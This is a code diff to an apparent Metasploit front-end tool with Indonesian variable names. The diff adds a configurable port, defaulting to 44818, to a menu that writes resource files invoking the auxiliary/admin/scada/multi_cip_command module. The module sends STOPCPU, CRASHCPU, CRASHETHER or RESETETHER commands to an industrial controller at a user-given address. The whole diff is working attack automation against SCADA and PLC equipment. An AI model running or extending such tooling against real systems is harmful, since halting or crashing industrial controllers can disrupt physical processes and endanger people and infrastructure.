@@ -77,8 +77,13 @@ def menu5():
         empty()
         back.menu['menu_utama']()
 
-    print(warna.kuning + "\n[!] " + warna.tutup + " only 4 attacks that will be accepted.\n (STOPCPU, CRASHCPU, CRASHETHER, RESETETHER)")
-    print(warna.hijau + "[*] " + warna.tutup + " Attacks : \n\t1 = STOPCPU\n\t2 = CRASHCPU\n\t3 = CRASHETHER\n\t4 = RESETETHER\n")
+    print(warna.kuning + "\n[!] " + warna.tutup + " default port is 44818")
+    port = raw_input(warna.biru + "\n[+] " + warna.tutup + " set Port number" + warna.kuning + " >> " + warna.tutup)
+    if port == '':
+        port = '44818'
+
+    print(warna.kuning + "\n[!] " + warna.tutup + " only 4 attacks that will be accepted. (STOPCPU, CRASHCPU, CRASHETHER, RESETETHER)")
+    print(warna.hijau + "\n[*] " + warna.tutup + " Attacks : \n\t1 = STOPCPU\n\t2 = CRASHCPU\n\t3 = CRASHETHER\n\t4 = RESETETHER\n")
     attack = raw_input(warna.biru + "[+] " + warna.tutup + " The attack to use" + warna.kuning + "  >>  " + warna.tutup)
     if attack == '':
         empty()
@@ -86,8 +91,8 @@ def menu5():
 
     if attack == '1':
         filewrite = open(txtool_dir + "/payload.rc", "w")
-        filewrite.write("use auxiliary/admin/scada/multi_cip_command\nset RHOST %s\nset ATTACK STOPCPU\nexploit\r\n\r\n" % (ip))
-
+        filewrite.write("use auxiliary/admin/scada/multi_cip_command\nset RHOST %s\nset RPORT %s\nset ATTACK STOPCPU\nexploit\r\n\r\n" %
+                        (ip, port))
         filewrite.close()
         start()
         finish_exploit()
@@ -96,7 +101,8 @@ def menu5():
 
     if attack == '2':
         filewrite = open(txtool_dir + "/payload.rc", "w")
-        filewrite.write("use auxiliary/admin/scada/multi_cip_command\nset RHOST %s\nset ATTACK CRASHCPU\nexploit\r\n\r\n" % (ip))
+        filewrite.write("use auxiliary/admin/scada/multi_cip_command\nset RHOST %s\nset RPORT %s\nset ATTACK CRASHCPU\nexploit\r\n\r\n" %
+                        (ip, port))
         filewrite.close()
         start()
         finish_exploit()
@@ -105,7 +111,8 @@ def menu5():
 
     if attack == '3':
         filewrite = open(txtool_dir + "/payload.rc", "w")
-        filewrite.write("use auxiliary/admin/scada/multi_cip_command\nset RHOST %s\nset ATTACK CRASHETHER\nexploit\r\n\r\n" % (ip))
+        filewrite.write("use auxiliary/admin/scada/multi_cip_command\nset RHOST %s\nset RPORT %s\nset ATTACK CRASHETHER\nexploit\r\n\r\n" %
+                        (ip, port))
         filewrite.close()
         start()
         finish_exploit()
@@ -114,7 +121,8 @@ def menu5():
 
     if attack == '4':
         filewrite = open(txtool_dir + "/payload.rc", "w")
-        filewrite.write("use auxiliary/admin/scada/multi_cip_command\nset RHOST %s\nset ATTACK RESETETHER\nexploit\r\n\r\n" % (ip))
+        filewrite.write("use auxiliary/admin/scada/multi_cip_command\nset RHOST %s\nset RPORT %s\nset ATTACK RESETETHER\nexploit\r\n\r\n" %
+                        (ip, port))
         filewrite.close()
         start()
         finish_exploit()
